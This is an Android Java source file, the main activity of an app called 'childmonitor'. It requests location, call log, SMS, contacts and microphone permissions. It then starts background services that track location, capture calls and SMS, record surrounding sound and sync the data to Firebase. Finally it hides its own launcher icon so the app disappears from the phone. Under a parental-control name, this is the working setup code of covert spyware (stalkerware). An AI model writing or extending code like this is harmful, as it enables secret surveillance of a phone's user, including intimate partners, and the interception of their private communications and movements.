package com.childmonitor;

import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.childmonitor.services.AppUsageService;
import com.childmonitor.services.CallSmsService;
import com.childmonitor.services.DailyReportService;
import com.childmonitor.services.FirebaseSyncService;
import com.childmonitor.services.LocationService;
import com.childmonitor.services.SurroundingSoundService;

public class MainActivity extends Activity {

    private static final int PERM_CODE = 100;
    private static final String[] PERMISSIONS = {
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.RECEIVE_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences prefs = getSharedPreferences("cm_prefs", Context.MODE_PRIVATE);
        boolean setupDone = prefs.getBoolean("setup_done", false);
        if (!setupDone) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERM_CODE);
            requestOverlayPermission();
            requestBatteryOptimization();
        } else {
            startAllServices();
        }
    }

    private void requestOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivity(i);
        }
    }

    private void requestBatteryOptimization() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName()));
            startActivity(i);
        }
    }

    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private void startAllServices() {
        startSvc(LocationService.class);
        startSvc(AppUsageService.class);
        startSvc(CallSmsService.class);
        startSvc(SurroundingSoundService.class);
        startSvc(FirebaseSyncService.class);
        startSvc(DailyReportService.class);

        getSharedPreferences("cm_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("setup_done", true).apply();

        hideIcon();
        finish();
    }

    private void startSvc(Class<?> cls) {
        try {
            Intent i = new Intent(this, cls);
            startForegroundService(i);
        } catch (Exception ignored) {}
    }

    private void hideIcon() {
        getPackageManager().setComponentEnabledSetting(
            new android.content.ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (!hasUsageStatsPermission()) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        } else {
            startAllServices();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        SharedPreferences prefs = getSharedPreferences("cm_prefs", Context.MODE_PRIVATE);
        if (!prefs.getBoolean("setup_done", false) && hasUsageStatsPermission()) {
            startAllServices();
        }
    }
}
